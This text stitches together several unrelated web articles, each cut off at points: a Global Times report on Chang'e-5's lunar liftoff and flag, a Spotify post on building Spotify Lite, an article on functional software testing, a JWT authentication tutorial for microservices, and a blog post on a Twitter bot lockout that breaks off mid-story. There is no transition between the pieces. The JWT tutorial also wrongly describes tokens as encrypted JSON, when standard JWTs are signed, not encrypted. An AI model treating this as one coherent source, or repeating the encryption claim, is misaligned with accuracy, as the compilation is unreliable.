<p>Flags on the moon Infographic: GT</p><p>"This is the first attempt in China's aerospace history to lift off from a celestial body other than Earth," chief editor of Aerospace Knowledge magazine Wang Ya'nan said. "The launch is a major test, in that the vehicle had to rely entirely on automatic maneuvers without any ground command."</p><p>Wang explained to the Global Times that the launch from the moon could not afford any time delay. "If the probe receives a command from the Earth to help it control the separation, altitude and speed, there will be at least one second delay, which will put the process in great danger."</p><center><img src="https://www.globaltimes.cn/Portals/0/attachment/2020/2020-12-04/dcc27158-a339-47cd-911b-ab2c6000a08c.jpg"></center>
<p>Photo: CNSA</p><p>Another factor that posed a challenge to the lunar takeoff is that the lander-ascender combination might sit on a slope, which would bring uncertainty to the probe's altitude and position. It means that the probe must ensure its own altitude is precise enough to enter the designated orbit through automatic decision-making, according to a statement sent to the Global Times from the China Aerospace Science and Technology Corporation (CASC.)</p><p>Chinese researchers have conducted numerous ground simulations to verify the takeoff, but the particularities of the lunar environment have made the verifications difficult, the CASC said.&nbsp;</p><p>The rendezvous and docking, if successful, could be of great value to other deep-space or even manned missions in the future, the significance of which would be no less than the Apollo mission, once the name card of human lunar exploration activities during the Cold War, Chinese analysts said.</p><p>"It will be a milestone for China's aerospace development," Song Zhongping, an aerospace expert and TV commentator, said, calling it "a foresighted practice that lays a technological foundation for future deep-space explorations."</p><p>It will also verify the viability of manned lunar landing missions, and even the construction of a lunar research base, or Mars missions, he told the Global Times.&nbsp;</p><center><img src="https://www.globaltimes.cn/Portals/0/attachment/2020/2020-12-03/7efca0cc-975e-491f-8f76-05cb5b7bbfe6.jpg"></center>

Chinese space technological development has allowed it to take a step forward in the Chang'e-5 mission, the third consecutive safe soft landing on the moon in seven years.&nbsp;</p><p>The Chang'e-5 flag presentation system was developed by China Space Sanjiang Group under the State-owned China Aerospace Science and Industry Corporation, better known as the CASIC.</p><p>To ensure a complete and smooth unfolding of the flag, the system adopted a secondary rod-type structure, which is applied in solar panel extending for satellites and other types of spacecraft, CASIC developers told the Global Times on Thursday.</p><center>
</center><p>The system weight has been controlled at around one kilogram, and all connecting parts of the system have been given special protection, such as coldness-resistance measures, to help overcome unfavorable lunar surface conditions, including a drastic temperature difference on the moon ranging from 150 C to minus 150 C, Li Yunfeng, the project leader, said in a statement the CASIC company sent to the Global Times.</p><p>"An ordinary national flag on Earth would not survive the severe lunar environment," so the research team also spent more than a year selecting the proper materials to make sure the eventual flag would be strong enough, survive under extreme coldness and heat and capable of showing the fine colors of the national flag and remain so forever, said Cheng Chang, another leading member of the developer team.</p><p>The national flag, 2,000 millimeters wide and 900 millimeter tall, represents cutting-edge technology, they said.</p><p>How to preserve its original color and shape are the two most crucial questions in designing a national flag that must survive more than 380,000 kilometers away from Earth, under extreme temperatures and radiation during its journey, Wang Ya'nan told the Global Times.&nbsp;</p><p>To get a sense of how difficult the task it is, five of the six flags (except for the one Apollo 11 placed on the moon) brought to the moon in the late 1960s and early 1970s during six US crewed moon landings, have been bleached white due to decades-long solar radiation, although they are reportedly still standing and casting shadows.</p><p>Many reports say the Apollo 11 flag was blown over by the exhaust from the ascent engine during lift-off.</p><p>The Soviet Union was the first country to imprint its national symbol on the moon, with a football-sized metal ball, carved with its national flag, full of explosives, smashing to the lunar ground in the Luna 2 mission in 1959.</p><p>Compared to such a method, China has a more advanced approach, which also greatly increased the complexity of the design, Wang noted.</p><center><strong><img src="https://www.globaltimes.cn/Portals/0/attachment/2020/2020-12-01/bb881cd5-4e1a-4040-8160-b364db57d633.jpeg"></strong></center>

"But China is about to showcase our own national flag as well, which I believe is a recognition of the achievements and breakthroughs that we have made, which will be the most valuable thing."</p><p>Some readers have left comments under images and video of the Chang'e-5 landing published on the Global Times twitter account in recent days, saying they would not be convinced and acknowledge China's achievements until the lander takes an actual photo of the American flag planted by the previous Apollo mission.&nbsp;</p><p>"Is it an original video, or a TikTok post taken in the Gobi desert," one Twitter user wrote.

<p>What if, for some users, the very best Spotify is a little less Spotify? Spotify Lite started as an experiment that had to be proven, both from a technical and a product-market fit perspective. In 2017, we found that a significant portion of registrations in some of our fastest-growing markets were happening on Android devices much older than what we were used to seeing in North American and European markets. Because of storage constraints, many of our potential users couldn’t install Spotify, and the ones that could weren’t getting the full “Spotify experience”.</p>



<p>Our mission was clear: we needed to make Spotify accessible to users with constrained resources, i.e., unreliable networks or phones with limited storage, memory, and low-resolution screens. Now we needed a team.</p>



<h2>A flexible, Lite team</h2>



<p>The main Spotify Music Android client is divided into multiple features, all owned by separate teams. But for Spotify Lite, we formed a single, autonomous team to fully own the entire process of designing, developing, and releasing the app. This allowed us to roll out an MVP product in record time.</p>



<p>Before building the new app, the Spotify Lite team — a cross-functional mix of insights, design, product, and engineering — travelled to a number of locations where Lite would be available in order to experience the network and device constraints firsthand. It was absolutely critical to design Spotify Lite with our users in mind, and to experiment and iterate on the streaming experience for cases when devices have poor connectivity or are completely offline. Only then were we able to come up with an optimal, performant solution.</p>



<p>It should be noted that we wouldn’t have achieved success had it not been for the existing tooling that we were able to reuse — tools for enabling recommendations, playback, search, browsing, and instrumentation. We were building on all the work, experience, and knowledge that came before us, giving us the ability to focus on finding solutions for our users.</p>



<h2>Spotify Lite: Spotify’s first separate app</h2>



<p>Creating a more performant and smaller version of the Spotify app proved to be more challenging than we liked, as the codebase hadn’t been modularized. With these challenges in mind, we decided to build a new separate app from scratch, giving us the ability to quickly iterate, obtain feedback, and innovate freely.</p>



<p>Spotify Lite was initially built on an entirely different playback stack than the regular Android app. This allowed Lite to be as small as possible, with minimal memory and network data usage. Having a separate app enabled us to test new performance ideas and to gain insights, such as understanding how application size impacts the new user funnel. We no longer use the initial playback stack, and have evolved towards a tailored setup that guarantees stability and playback quality on unreliable networks.</p>



<p>Building Lite was a lot like packing a backpack for your travels. With limited space, you have to be selective in what you bring. Only the most crucial and necessary components were carried forward.</p>



<h2>A balancing act</h2>



<p>Shrinking the original Spotify app to create Spotify Lite brought up two crucial questions: What key elements of the original Spotify should remain intact to ensure listeners still get the “Spotify experience”? And what sacrifices do we need to make to ensure Spotify Lite does, in fact, remain light?&nbsp;</p>



<p>In answering the first question, we knew that keeping the brand look and feel was absolutely critical to giving listeners a Spotify they could recognize. So, we used the same design philosophy as the original Spotify Android app. However, given a range of constraints (smaller screens, quick/performant interactions), we had to adapt some of our design choices. For example, information density has to be reviewed with smaller screen sizes and lower resolutions in mind, as well as whether information is still readable on a broken or scratched screen (these phones have been around for a while!). We’ve recently added our heuristics for how to design for these constraints to the overall design strategy so that this is kept in mind for other apps and surfaces, as well.</p>



<figure><img loading="lazy" width="700" height="444" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2020/12/Spotify-Lite_Iphone-Mockups-01-700x444.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2020/12/Spotify-Lite_Iphone-Mockups-01-700x444.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2020/12/Spotify-Lite_Iphone-Mockups-01-250x159.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2020/12/Spotify-Lite_Iphone-Mockups-01-768x487.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2020/12/Spotify-Lite_Iphone-Mockups-01-1536x975.png 1536w, https://storage.googleapis.com/rnd-atspotify/sites/2/2020/12/Spotify-Lite_Iphone-Mockups-01-2048x1300.png 2048w, https://storage.googleapis.com/rnd-atspotify/sites/2/2020/12/Spotify-Lite_Iphone-Mockups-01-120x76.png 120w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<p>Along with streamlining the design, we also had to shrink things down under the hood. The team put a lot of work into implementing all the known techniques for binary size reduction, as well as making tradeoffs when selecting features. As the app includes a native shared library for playback, we have experimented with many compiler and linker flags to prioritize a small app size. This includes, for instance, switching to the <em>lld</em> linker, employing link time code optimizations, and disabling certain language features like RTTI.&nbsp;</p>



<p>On the Android side, it was the use of App Bundles for application publishing, optimizing our R8 shrinking, carefully choosing dependency libraries, and stripping unused translations. We made an effort to reduce the install size, too. We store the shared library unpacked in the APK without copying it to the install folder, and allow users to store both the app and its cache and downloads separately on the SD card.</p>



<p>After the initial larger gains, it became harder and harder to reduce the app size. It was a constant balance between keeping it small while adding additional requested features. Along with monitoring the app download and install sizes in the Google Play Store, we added checks to our continuous delivery pipelines to prevent size bloat.</p>



<h2>Lite is different</h2>



<p>Because Lite was a brand-new concept, some of our work went beyond the app itself, leading to improvements to Spotify systems that other teams could benefit from, too.</p>



<p>Before Lite, developers could safely assume there was only one Spotify app for any given platform — the Android platform and the Android app were considered one and the same. Backend services — including those providing application views and deciding which features are enabled — were built with that assumption in mind. Some of these assumptions cascaded through many different parts of our internal systems.&nbsp;</p>



<p>When we added Lite to the mix, developers needed to know exactly which app a user was using, not just what platform they were on. We generalized that issue beyond our own app and built ways to identify all the apps in the Spotify ecosystem. That work paid off again each time anyone introduced a new Spotify app to the Android platform, including our sister apps <a rel="noreferrer noopener" href="https://www.spotify.com/us/kids/?utm_source=us-en_brand_contextual_text&amp;utm_medium=paidsearch&amp;utm_campaign=alwayson_ucanz_us_premiumbusiness_kids_brand+contextual-desktop+text+exact+us-en+google&amp;gclid=CjwKCAiA8Jf-BRB-EiwAWDtEGnamKsxw1Yx_w3KgzFDyJ1g4NKVvIUkc9jRA8fBFdlHCkR8pD4iHmBoCMLAQAvD_BwE&amp;gclsrc=aw.ds" target="_blank">Spotify Kids</a>, <a rel="noreferrer noopener" href="https://www.spotify.com/us/stations/" target="_blank">Spotify Stations</a>, and <a href="https://spotify-everywhere.com/collections/car-audio/products/polestar" target="_blank" rel="noreferrer noopener">Android Automotive</a>.</p>



<p>We also had to redesign parts of Spotify’s playback library with Lite constraints in mind — taking into account smaller download and installation sizes, memory usage, and the reduced feature set. Similar considerations have been applied to Spotify’s music and image transcoding services.</p>



<h2>Making Lite a big deal</h2>



<p>Our ambition is to be the best-in-class Lite app. We are constantly modifying and updating the app to adapt to our users and their ever-evolving needs. As we’ve seen positive adoption of Spotify Lite since launch, we’ve invested in performance improvements, quality, and resilience. We recently rolled out an overhaul of our client architecture to cater to our growing user base and to reduce playback latencies.</p>



<p>The birth of Spotify Lite has given us flexible solutions that our other apps have benefited from. One such example is our backend service that scales down images to use less network traffic. Another is the support for App Bundles, which has allowed us to reduce the app size significantly so that users only download the assets needed for their particular device. Creating a separate app was a first for our build system — one that laid the groundwork for building native dependencies, sharing code components, and setting up crash and ANR reporting for tracking app quality.</p>



<p>We are continuing our work to lower the barrier for people to access Spotify. We have our backlog full of ideas and performance improvements we want to keep investing in, not only for Lite but also for our other apps to benefit from.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><picture><source srcset="https://www.deviqa.com/static/images/posts/functionaltesting/functional-testing.png?webp" type="image/webp" media="(min-width: 600px)"><img src="https://www.deviqa.com/static/images/posts/functionaltesting/functional-testing.png?webp" alt=""></picture></div></div><p>It is no exaggeration to say that functional testing is the backbone of the whole QA process.</p><p>Functional testing is a type of software testing that checks software for consistency with project requirements. A QA engineer verifies every software function during functional testing, providing corresponding input, and checking if the outcome complies with the specification. It is an extensive and time-intensive type of software testing.</p><p>As a rule, the black-box technique is leveraged for functional testing execution as QA engineers imitate end-users' behavior.</p><p>Features that distinguish functional testing from other types of software testing:</p><div><div><p>Particular focus on a specification. The primary purpose is checking whether an app complies with the specification.</p></div><div><p>Early start. Functional testing must be started as soon as a UI is ready.</p></div><div><p>Functional testing cannot be ad hoc. In the process of functional testing, QA engineers strictly adhere to a testing plan.</p></div><div><p>Functional testing doesn't pay attention to software usability, performance, or stability unless they somehow affect functionality.</p></div></div><h2 id="text-14-4-0">Types of Functional Testing</h2><p><span><img src="https://www.deviqa.com/static/images/posts/functionaltesting/functional-testing-types.png?webp" alt="Functional Testing Tools"></span></p><p>As we have already found out, functional testing refers to software functionality verification. Still, functional testing can be conducted in different ways, depending on the situation and goals. Thus, we can differentiate such types of functional testing:</p><h3 id="text-20-5-0">Smoke Testing</h3><p>Core features testing aimed to check if a new build is stable enough to execute more exhaustive testing.</p><h3 id="text-24-5-0">Sanity Testing</h3><p>A subset of regression testing that checks work of a particular function.</p><h3 id="text-28-5-0">Regression Testing</h3><p>Consistent testing checking if new code modifications haven't affected previously developed functionalities.</p><p>Taking into account its specificity, functional testing can be conducted on all testing levels. In these terms, we can speak about the corresponding types of testing:</p><div><div><p>Unit Testing checks whether every single code unit works properly.</p></div><div><p>Integration Testing checks whether combined app modules work properly.</p></div><div><p>System Testing checks a fully integrated software solution.</p></div><div><p>User Acceptance Testing is final testing executed by a customer or end-users to make sure of proper app work in real-world scenarios and compliance with all requirements.</p></div></div><h2 id="text-39-4-0">Functional Testing Process</h2><p><span><img src="https://www.deviqa.com/static/images/posts/functionaltesting/functional-testing-process.png?webp" alt="Functional Testing Tools"></span></p><div><div><div><p><strong>Carefully analyze product documentation</strong></p><p>It is essential to thoroughly study project specifications to understand how an app should work, define main goals, and create a test plan.</p></div></div><div><div><p><strong>Define functionalities that should be tested</strong></p><p>On the ground of project requirements, QA engineers identify software functionalities that should be checked during functional testing.</p></div></div><div><div><p><strong>Identify appropriate test data</strong></p><p>Having studied requirements, QA engineers identify relevant test data.</p></div></div><div><div><p><strong>Create test cases</strong></p><p>QA experts make up test cases, covering functionality that must be tested.</p></div></div><div><div><p><strong>Execute test cases</strong></p><p>Once a UI is ready, a QA engineer starts work on the test execution.</p></div></div><div><div><p><strong>Log bugs</strong></p><p>If any bugs are detected, they must be reported and logged to an issue tracking system.</p></div></div></div><h2 id="text-67-4-0">Functional vs. Non-Functional Testing</h2><p>To help you clearly understand the point of functional testing, we recommend you compare it with non-functional testing.</p><div><table><thead><tr><th>Functional Testing</th><th>Non-Functional Testing</th></tr></thead><tbody><tr><td>Functional tests deal with app functionality.</td><td>Non-functional tests focus on such software characteristics as performance, scalability, and robustness, i.e., system work and behavior.</td></tr><tr><td>Functional testing concentrates on the project requirements.</td><td>Non-functional testing concentrates on users' expectations related to such software characteristics as loading time, stability, robustness, etc.</td></tr><tr><td>Functional testing is of primary importance, and therefore it is performed on a first-priority basis.</td><td>As it is not reasonable to check the general app performance if its core features work improperly, non-functional testing is conducted later.</td></tr><tr><td>Either manual or automated testing techniques can be used for functional testing execution.</td><td>The manual testing technique is not suitable for non-functional testing, which is usually conducted with automation tools.</td></tr></tbody></table></div><h2 id="text-78-4-0">Functional Testing Techniques</h2><p>Functional testing is based on the project specification, which can contain either functional requirements or business scenarios. As a result, two techniques can be applied:</p><div><div><p>Requirement oriented testing is conducted on the ground of functional requirements.</p></div><div><p>Business scenario oriented testing is conducted with due regard for the business process.</p></div></div><h2 id="text-85-4-0">Functional Test Automation</h2><p>Functional testing can be conducted manually. However, when it comes to regression testing of a large-scope project, it makes sense to implement automation. Automated functional testing implies test execution by means of the pre-written scripts with no or little human supervision. Automated functional testing can bring numerous benefits.</p><p>First of all, automated functional tests can be run 24/7 without human involvement. It significantly speeds up the whole testing process. Secondly, automated testing helps avoid human errors and test skipping. Thirdly, they can be rerun whenever it is needed. And finally, it can be cost-effective in the long-term.</p><p>The following aspects must be considered for the effectiveness of functional tests automation:</p><div><div><div><p><strong>Select an appropriate automation tool</strong></p><p>Complete a list of requirements and desired features and pick up an automation tool according to them.</p></div></div><div><div><p><strong>Automate appropriate test cases</strong></p><p>You should thoughtfully select test cases for automation. First of all, you should take into account frequently repeated tests, test cases of high priority, time-consuming test cases, and those that must be run on different browsers and environments.</p></div></div><div><div><p><strong>Frequently run tests</strong></p><p>As soon as a basic suite of automated tests is ready, it is recommended to conduct frequent tests. Thus, you can improve your automation framework and detect more bugs.</p></div></div><div><div><p><strong>Continuously maintain automated scripts</strong></p><p>To avoid test failures and hassle, it is important to continually maintain scripts in accordance with application development and updating.</p></div></div></div><h2 id="text-109-4-0">Functional Testing Tools</h2><p><span><img src="https://www.deviqa.com/static/images/posts/functionaltesting/functional-testing-tools.png?webp" alt="Functional Testing Tools"></span></p><p>To automate functional tests, QA engineers use various tools and frameworks available on the market. These tools considerably simplify testing and provide accurate results.</p><p>These days, there is a vast variety of automation tools. As a rule, QA engineers choose those that comply with project requirements and their own preferences and skills.</p><p>Below you can find the most popular automation tools:</p><h2 id="text-130-4-0">Advantages</h2><p>Functional testing has two main advantages, which are:</p><div><div><p>It imitates end-users' interaction with the software, providing an accurate evaluation of product quality.</p></div><div><p>It ensures high software quality and compliance with both business needs and technical requirements.</p></div></div><h2 id="text-137-4-0">Disadvantages</h2><p>Nothing is perfect in this world, and functional testing also has some weak spots:</p><div><div><p>Very often, functional testing includes redundant tests.</p></div><div><p>There is a chance to omit critical errors.</p></div><div><p>If requirements are unclear or absent, it is challenging to conduct functional testing effectively.</p></div></div><h2 id="text-145-4-0">Conclusion</h2><p>Functional testing is an essential part of the QA process. This testing type ensures product quality, conformance to the requirements, and user satisfaction. It can be rather extensional and time-consuming; therefore, it is reasonable to imply automation when it comes to large scope projects. To make automated functional tests effective, it is crucial to choose a proper automation tool and automate the right test cases. Moreover, continuous script maintenance is your ticket to success in test automation.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><h2 id="introduction">Introduction</h2><p>Microservices are a great tool when it comes to designing scalable and extensible architectures. They can be used to encapsulate different behaviors or responsibilities in a way that not a lot  of other architecture paradigms can represent.
And if you pair them with a REST-based interface, then you’re not only writing and creating a platform that can grow and scale automatically (given the right infrastructure of course), but you’re also creating a standard and easy-to-use product. </p><p>If you haven’t noticed, I’m a fan of microservices and they’re usually the pattern I go with when designing new architectures, working with Big Data on a day-to-day basis, I tend to require flexibility and scalability out of the box, and they provide that to me.</p><p>The thing not everyone considers when writing microservices though is that they require a way for you to authenticate against them. Both if you’re using a front-end client or just communicating with them through another microservice. And although there are several options out there to solve authentication, I want to cover one of the easiest, yet most powerful, alternative: JSON Web Tokens.</p><h2 id="jwt-based-authentication">JWT-based Authentication</h2><p>The basic thing you need to understand JWT-based authentication is that you’re dealing with an encrypted JSON which we’ll call “token”. This token has all the information required for the back-end system to understand who you are and if, indeed, you are who you say you are.</p><p>The following diagram shows the steps involved in this process:</p><p><img tabindex="0" loading="lazy" src="https://blog.asayer.io/static/eae220053d72e95dbe803496c8aac458/d2d42/s_1048F41B3AC814B927887FF3C86602B940107555916A37D85A0BACB9135A34EA_1606545347515_jwt.png" srcset="https://blog.asayer.io/static/eae220053d72e95dbe803496c8aac458/d2d42/s_1048F41B3AC814B927887FF3C86602B940107555916A37D85A0BACB9135A34EA_1606545347515_jwt.png 545w" sizes="(max-width: 545px) 100vw, 545px" alt="null"></p><p>As you can see, leaving out the user-based steps, you only need 4 steps:</p><ul><li>First, the client application (here I used a front-end app, but you can do the same with another service) will send a sign-in request. This means you’re sending the log-in credentials, just this once.</li><li>Second, the API will validate these credentials and if they’re correct, it’ll generate the token. This is the most important step because the generated token as I mentioned is nothing more than an encrypted JSON object. This allows you to add as much data into it as you want, and you will want to add data because JWT allows you to perform stateless authorization, which I’ll cover in a second.</li><li>Third, with the JWT generated, all you have to do is return it back to the client application. </li><li>Finally, the client app will later send this token on every subsequent request. This token means you’ve been authenticated and can access the secret section of the application.</li></ul><p>That is it, the flow is very straightforward and you don’t need to redirect the user anywhere (I’m looking at you OAuth!).
But let’s get into it with more details, let me break up each step for you to fully understand what is happening behind code.</p><h3 id="the-back-end-side-of-things">The back-end side of things</h3><p>For the back-end, or the microservice if you will, there are two major steps that you need to understand: </p><ol><li>Generating the JSON Web Token. This is key, as I mentioned before because the information you add will be used later (kinda like saying “everything you say will be used against you in a court of law”).</li><li>Validating the token for received requests. I left this part out of the authentication process because this is actually part of the authorization flow. Very similar, and easy to implement, but worth noting as well.</li></ol><p>So, let’s get into it.</p><h4 id="generating-the-jwt">Generating the JWT</h4><p>To generate the token on your back-end microservice, you’ll normally use an existing server-side library. There is no need for you to understand how the token is generated, you just need to understand what goes into it. </p><p>So, what actually goes into the token? You can literally use a JSON object such as:</p><p>And that will be used and sent back to the front-end client, which may be for your business logic it makes sense, maybe your front-end client is waiting for the “foo” key. However, other than the custom attributes you can add, there are also pre-defined options that have a functional meaning for the specific algorithm that the library is using.</p><p>Given I’ll be using the <a href="https://www.npmjs.com/package/jsonwebtoken" target="_blank" rel="noreferrer">jsonwebtoken</a> library for Node.js, the main option you want to take into account is  <code>expiresIn</code>. This is critical to generating a proper JWT because you want the token to have an expiration date. Otherwise, it will last forever, potentially leaving an open vulnerability for someone who can capture it and later use it to impersonate your identity.
For this particular library, this value is expressed in seconds if you provide a number (or you can provide a string using a time unit for something like <code>"``2 days``"</code> to signify 2 days of validity). </p><p>And in turn, the library will add another one called <code>iat</code> which stands for <strong>Issued At</strong> and is a date reference used for expiration checks (i.e that’s the date it’ll take into account when checking if your token is still valid).</p><p>And how do you add all this information into the token then? By signing it:</p><div><pre><p><span>1</span><span>const</span><span> jwt </span><span>=</span><span> </span><span>require</span><span>(</span><span>'jsonwebtoken'</span><span>)</span><span>;</span><span></span></p><p><span>2</span><span>    </span></p><p><span>3</span><span>    </span><span>const</span><span> token </span><span>=</span><span> jwt</span><span>.</span><span>sign</span><span>(</span><span>{</span><span></span></p><p><span>4</span><span>        data</span><span>:</span><span> </span><span>'foobar'</span><span></span></p><p><span>5</span><span>      </span><span>}</span><span>,</span><span> </span><span>'your-secret-key-here'</span><span>,</span><span> </span><span>{</span><span> expiresIn</span><span>:</span><span> </span><span>60</span><span> </span><span>*</span><span> </span><span>60</span><span> </span><span>}</span><span>)</span><span>;</span><span> </span><span></span></p><p><span>6</span><span>       </span></p><p><span>7</span><span>    </span><span>console</span><span>.</span><span>log</span><span>(</span><span>token</span><span>)</span><span></span></p><p><span>8</span><span>    </span></p></pre></div><p>Using the <code>sign</code> method you can create the token, notice that your main object (the one containing the actual information you want to transfer to the front-end) is the first parameter, the second one is the secret key or phrase (you can either pass a secret phrase of your choosing, something that you’ll have to share with your clients) or the content of a PEM key. Either way, the second parameter is used for the encryption algorithm to encode and create the token. Finally, the third attribute contains the configuration options (in our case only the expiration time).</p><p>This token (notice the output on the code above) is then returned as part of the authentication response, for the client to use. </p><h4 id="storing-the-token">Storing the token</h4><p>As an optional step, you can also store the token in your database  to associate it with your user. Normally, you wouldn’t need to do this if all the user information can be stored in your token.
However, if there is more information to manage that you can comfortably store in your token, then keeping an association with your user’s profile inside the database might be a good idea.
In fact, given that looking up this token would be something you’d do on every request, a good alternative is to keep both, the token and the relevant information about your user inside some in-memory storage,  such as <a href="https://redis.io/" target="_blank" rel="noreferrer">Redis</a>. </p><p>The new flow, with storage incorporated and verification support is the following one:</p><p><img tabindex="0" loading="lazy" src="https://blog.asayer.io/static/fe0c8ead812da347af4abd251f5f0a7e/e0d28/s_1048F41B3AC814B927887FF3C86602B940107555916A37D85A0BACB9135A34EA_1606580178077_jwt3.png" srcset="https://blog.asayer.io/static/fe0c8ead812da347af4abd251f5f0a7e/e0d28/s_1048F41B3AC814B927887FF3C86602B940107555916A37D85A0BACB9135A34EA_1606580178077_jwt3.png 689w" sizes="(max-width: 689px) 100vw, 689px" alt="null"></p><p>The taxing interaction here is not the first one (#4) with Redis, but rather the second one (#9) because this one would happen on every request received. We’ll see more about that in a second.</p><h4 id="checking-the-token">Checking the Token</h4><p>Just because we’re getting a token as part of the request, it doesn’t mean such a request is safe, it could very well be a fake one or have an invalid or even expired token. This is why on every request of a secured resource (i.e an endpoint that requires an authenticated user to be accessed, or a section of your website that lives inside the member’s zone) you need to validate the token received.
If you’ve skipped the storage step, then this is a relatively cheap task. All you have to do is use the same server-side framework to validate it:</p><div><pre><p><span>1</span><span>const</span><span> decodedToken </span><span>=</span><span> jwt</span><span>.</span><span>verify</span><span>(</span><span>token</span><span>,</span><span> </span><span>'your-secret-key-here'</span><span>)</span><span></span></p><p><span>2</span><span>    </span><span>console</span><span>.</span><span>log</span><span>(</span><span>decodedToken</span><span>)</span></p></pre></div><p>Notice how I’m using the same “secret phrase”, that’s definitely important because you need to keep using the same one throughout the same project otherwise validation will not work.
An expired token would throw an exception such as:</p><p><img tabindex="0" loading="lazy" src="https://blog.asayer.io/static/b943837a3499dec9c41a2c4309385182/66f0f/s_1048F41B3AC814B927887FF3C86602B940107555916A37D85A0BACB9135A34EA_1606627819976_Captura%2Bde%2Bpantalla%2B2020-11-29%2Ba%2Blas%2B6.30.08.png" srcset="https://blog.asayer.io/static/b943837a3499dec9c41a2c4309385182/66f0f/s_1048F41B3AC814B927887FF3C86602B940107555916A37D85A0BACB9135A34EA_1606627819976_Captura%2Bde%2Bpantalla%2B2020-11-29%2Ba%2Blas%2B6.30.08.png 2034w" sizes="(max-width: 2034px) 100vw, 2034px" alt="null"></p><p>And a valid one would just return a valid JSON that you can decode and use however you need.</p><div><pre><p><span>1</span><span>{</span><span> data</span><span>:</span><span> 'foobar'</span><span>,</span><span> iat</span><span>:</span><span> </span><span>1606581962</span><span>,</span><span> exp</span><span>:</span><span> </span><span>1606581963</span><span> </span><span>}</span></p></pre></div><p>Notice the <code>iat</code> and <code>exp</code> parameters added by the library.
An exception in this context would mean you need to invalidate the client’s request and send an invalid response. Normally you would send back a 403 error code since the request is (and the client) is no longer authenticated.</p><h3 id="spa-authentication">SPA authentication</h3><p>Now that we understand what it means for an API (or a microservice if you will) to be protected by a JWT authentication process, I wanted to cover the same process from the POV of a SPA application acting as the client app.
In this case, as I mentioned, you’ll be contacting a service initially by sending your credentials and receiving a token which you’ll have to use on every following request.
The first thing we need to understand though is that session-based authentication is not the same as token-based auth. </p><h4 id="session-based-vs-token-based-authentication">Session-based vs Token-based authentication</h4><p>At a first glance, both of these strategies might seem similar, which is why I wanted to cover the difference.
Essentially both methods work the same way:</p><ol><li>You authenticate against a service.</li><li>That service validates your credentials and sends back a token</li><li>On every following request, you send that token to authenticate yourself with the service.</li></ol><p>So as you can see, the process and the flow of data seem to be the same, but there are some major differences hidden.</p><ul><li>For session-based tokens, the server returns a session key, which references the session data (all data relevant to you as a logged-in user). This data, however, is kept in the memory of the server. This essentially breaks one of the benefits of RESTful APIS: stateless services can scale effortlessly because there is no session information stored in memory. You see, the moment you log-in with a server that keeps session information in memory, every subsequent request sent by you needs to go to that server (because memory can’t be shared between different servers, or at least not easily). If you’re trying to scale up your architecture to handle more traffic, duplicating services to increase your capacity will not be as straightforward as it would be if you had stateless services.</li><li>Session-based auth stores the session key in the browser’s cookies. They send the information as a cookie, and because of that, browsers have a problem when having microservices being served from different domains. This is not a problem for …</li></ul></div></article></div>

<p>If you swung by my Twitter profile in the last week, you probably saw this:</p>
<p>
  <img src="https://dev-to-uploads.s3.amazonaws.com/i/olflh5jfvk5clb15p5z9.png" alt="Alt Text">
</p>
<p>I'm not sure of the precise causes of me being locked out, but I have several abnormal usage factors that probably put me on the high end of Twitter's bot risk system:</p>
<ul>
  <li>I currently live in Singapore but am primarily active during US hours and have a US Phone Number</li>
  <li>I post about 30 tweets a day, probably on the high end of most Twitter users. (30 sounds like a lot, but it's mostly replies, and I maybe post 2-3 actual top tweets a day)</li>
  <li>I switch between and manage three different accounts (<a href="https://twitter.com/Coding_Career">Coding Career</a> and <a href="https://twitter.com/SvelteSociety">Svelte Society</a>) multiple times a day</li>
  <li>As far as I know I have not been reported on, but I do have people that strongly dislike me and they may have used the report button against me. Can't rule that out as a factor.</li>
  <li>Anecdotally <a href="https://twitter.com/b2m9/status/1295748479713779712?s=20">some IPs seem more risky</a> than others - I also use a VPN for work which probably shows me jumping across multiple countries in a single day, which is certainly suspicious on the face of it</li>
  <li>I have also noticed I get verification checks more often when I use scheduled tweets.</li>
</ul>
<p>If you clicked through my scary profile you also saw this:</p>
<p>
  <img src="https://dev-to-uploads.s3.amazonaws.com/i/6xjg8jxiwgidwffvwsnu.png" alt="Alt Text">
</p>
<p>I swear that I haven't mass unfollowed everybody! Most people see this and assume that I used some script to mass unfollow everyone and therefore got flagged as a bot. <strong>The reality is the exact opposite</strong> - I got flagged as a bot, and by default Twitter temporarily removes all follows.</p>
<p>It will be restored once I regain my Twitter account (I've filed a support ticket and am trying to reach out to friends at Twitter for help), but this is the exact user experience I wanted to talk about for this post.</p>
<p>First, a quick detour for a personal anecdote.</p>
<section>
  <h2 id="aside-my-time-as-a-cuban-detainee"><a href="#aside-my-time-as-a-cuban-detainee">Aside: My Time As A Cuban Detainee</a></h2>
  <p>A long time ago I visited Havana with some college friends. Right after landing we headed into a restaurant, all our luggage in tow. After we were done eating, I stood up and turned around - only to find all my luggage gone! Someone had stolen it while we were eating. The restaurant staff of course swore up and down that they had not seen who had taken it.</p>
  <p>Losing all your luggage on day 1 of a weeklong trip sucks, but what is worse is that <strong>my passport was in my luggage</strong>. I needed it to head back to the US at the end of my trip.</p>
  <p>If you've never lost a passport while traveling before, it's a quick trip to bureaucratic hell. If your country has an embassy where you are traveling, you can usually get it reissued in the embassy. But we were in <em>Cuba</em> - and my country had no embassy here. We reported my case to the authorities, but they had no idea what to do. I was an edge case. Worse still, because I said I had come from the US and couldn't produce any papers to prove my identity, I was detained at the police headquarters for questioning on suspicion of being a spy. (<em>I was never really at any risk - being Asian and speaking poor Spanish, I would have made for a pretty lousy spy</em>).</p>
